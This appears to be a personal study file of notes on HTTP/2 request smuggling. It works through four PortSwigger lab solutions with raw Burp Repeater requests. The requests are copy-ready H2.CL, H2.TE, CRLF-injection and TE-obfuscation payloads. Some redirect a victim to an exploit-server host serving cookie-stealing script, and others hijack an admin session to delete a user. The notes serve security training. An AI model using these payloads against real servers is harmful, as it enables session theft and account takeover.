# <u>**HTTP Request Smuggling Notes**</u>

---

## Overview

- These notes describe how to detect and exploit HTTP/2 → HTTP/1.1 downgrading request smuggling attacks.
- Follow the baseline checks first to determine whether HTTP/2 is in play and whether the front-end downgrades or tolerates ambiguous length headers.
- Labs included below demonstrate practical exploitation techniques (H2.CL, H2.TE, CRLF injection, and TE obfuscation).

---

## Quick checklist to confirm H2 downgrade candidates

1. Confirm H2 is in play
   - Check the Inspector's `Protocol` field. If the target never negotiates HTTP/2 (only HTTP/1.1), stop here and test classic CL/TE and TE/CL smuggling on HTTP/1.1 only.

2. Baseline: send Content-Length (CL) + Transfer-Encoding (TE) together and compare H/1.1 vs H/2
   - Send the same request twice, toggling the protocol in the Inspector between HTTP/1.1 and HTTP/2.
   - If HTTP/1.1 rejects the request (400) but HTTP/2 accepts it (200), you have a live HTTP/2 → HTTP/1.1 downgrade candidate.
   - If both protocols reject it cleanly, CL/TE probing is ineffective — skip to CRLF injection tests.

3. Test H2.CL (recommended first — this is a legal H/2 vector)
   - Send `Content-Length: 0` with a smuggled prefix in the body (use a POST over HTTP/2). Target a non-existent path so you can detect smuggling by observing weird 404 behavior.
   - If a subsequent request unexpectedly returns 404, the backend appended your prefix to that request: H2.CL confirmed.

4. Test H2.TE
   - If H2.CL shows nothing, add `Transfer-Encoding: chunked` (use the raw header editor if necessary) and drop `Content-Length`.
   - Send a chunked body (ending in `0`) with a smuggled prefix. Same 404-on-next-request check. If 404s appear, H2.TE confirmed.

5. Test CRLF injection
   - If steps above fail, try injecting literal CRLFs inside a header value (in HTTP/2 you can edit header values via the Inspector and include a CRLF by Shift+Enter).
   - Use this to smuggle a `Transfer-Encoding` header or a whole CRLF-terminated second request. Same 404-on-next-request check.
   - If this fails too, the target likely isn't vulnerable to H/2 downgrade smuggling.

---

## Labs (step-by-step, in plain words)

### Lab 1 — H2.CL attacks (smuggle with Content-Length: 0)

Objective:
- The front-end downgrades ambiguous HTTP/2 requests; smuggle a prefix that makes a victim load a malicious JS resource (alert(document.cookie)). The victim visits the home page every 10 seconds.

Steps (in my words):
1. Ensure the Inspector shows the request protocol as HTTP/2.
2. In Burp Repeater, craft a POST / request with `Content-Length: 0` and put the smuggled payload directly in the body, e.g.:

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```

3. Send the request repeatedly until you notice every second request returns 404 — that confirms the backend has appended your smuggled prefix to the next request.
4. Find the redirect behavior of the app (e.g., `GET /resources` redirects to `/resources/`). Use that to craft a smuggled GET request to /resources with an arbitrary Host header:

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```

5. Upload your malicious JS (e.g., `alert(document.cookie)`) to the exploit server at path `/resources`.
6. Replace the Host header in the smuggled GET with your exploit server host:

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```

7. Send the smuggling request a few times until you get a redirect to the exploit server, then wait for the victim's periodic page load (victim visits every ~10s). Check the exploit server logs for `GET /resources/` from the victim.

Notes:
- Timing matters — you must poison the backend connection immediately before the victim's browser requests the resource; repeat attempts are normal.


### Lab 2 — Response queue poisoning via H2.TE (chunked)

Objective:
- Use chunked-encoded HTTP/2 smuggling to poison the backend response queue, steal an admin session cookie, and delete the user `carlos`. The admin logs in approximately every 15 seconds.

Steps (in my words):
1. Ensure protocol is HTTP/2 in the Inspector.
2. Try a minimal chunked smuggling test to confirm behavior:

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

- If every second request returns 404, the backend is appending your prefix.

3. Craft a smuggled full request to /x (non-existent endpoint so your own requests return 404). Terminate the smuggled request with `\r\n\r\n` after Host header:

```
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net


```

4. Send that request (you should get a 404). Wait ~5s then send again. If you receive a non-404 (e.g., 302 with admin session), you captured an admin response.
5. Repeat until you capture a 302 containing the admin's session cookie. If the connection gets into a bad state, send ~10 ordinary requests to reset it and try again.
6. Use the stolen session cookie to request `/admin` via HTTP/2 and retrieve the admin panel. Find and request `/admin/delete?username=carlos`.

Notes:
- Back-end connections may reset every ~10 requests; plan retries accordingly.


### Lab 3 — HTTP/2 request smuggling via CRLF injection

Objective:
- CRLF injection in an HTTP/2 header value to smuggle a second request and steal a victim's session cookie. Victim visits home every ~15s.

Steps (in my words):
1. In Burp's browser, use site search a few times so your recent searches are recorded.
2. Send the most recent `POST /` to Repeater and remove your session cookie so you can detect victim activity.
3. Make sure protocol is HTTP/2 in the Inspector.
4. Add an arbitrary header (e.g., `foo`) and include a literal CRLF sequence in its value followed by a `Transfer-Encoding: chunked` header. In Inspector, type the CRLF by using Shift+Enter inside the header value editor (not by copy/paste). Example header value:

```
bar\r\nTransfer-Encoding: chunked
```

5. In the body, send a 0 chunk followed by the smuggled data (the smuggled prefix may be a `POST` or `GET` that includes an embedded session cookie). Example body:

```
0

SMUGGLED
```

6. If your timing is right you will see the victim's request start appear in the recent searches (a GET) containing their session cookie — that means you stole their cookie.
7. Use the stolen cookie in Burp to request the home page and solve the lab.

Notes:
- If you see your own POST reflected, you refreshed too early; try again and wait longer before refreshing the browser.


### Lab 4 — HTTP/1 obfuscated TE header (GPOST)

Objective:
- The front-end rejects methods other than GET/POST. The back-end treats duplicate/obfuscated headers differently. Smuggle a request so the next backend request appears to use method `GPOST` and get Unrecognized method GPOST.

Steps (in my words):
1. Switch Repeater to HTTP/1.1 in Inspector (the exercise requires HTTP/1 techniques even though the lab supports H/2).
2. In Repeater, disable "Update Content-Length" (so Burp won't auto-fix lengths).
3. Send the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

- Make sure to include the trailing `\r\n\r\n` after the final `0` to properly terminate the chunked stream.

4. The second response should say: "Unrecognized method GPOST." That indicates the back-end saw `GPOST` and the front-end did not reject because of the obfuscation.

Notes:
- The intended solution for this lab relies on HTTP/1 only.

---

## Practical tips & reminders

- Always confirm protocol in the Inspector before sending a test.
- Use non-existent paths (e.g., `/x`) for easy detection via 404 responses when poisoning queues.
- When editing banned headers in Burp, use the raw header editor/Inspector and be prepared to enter Transfer-Encoding or Content-Length manually.
- Timing and retries are normal — many labs require multiple attempts to align with victim/admin periodic activity.

---

## Useful example request snippets (copy/paste into Repeater)

H2.CL smuggling example:

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```

H2.TE smuggling example (chunked):

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net


```

CRLF injection header example (enter CRLF via Shift+Enter in Inspector):

Header name: foo
Header value: bar\r\nTransfer-Encoding: chunked


HTTP/1 TE obfuscation (GPOST) example (HTTP/1.1):

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

---

Notes: I kept the labs' solutions in the same structure and language you provided, clarified steps, and added code snippets and practical tips so the file is neat and copy/paste ready for Burp Repeater.
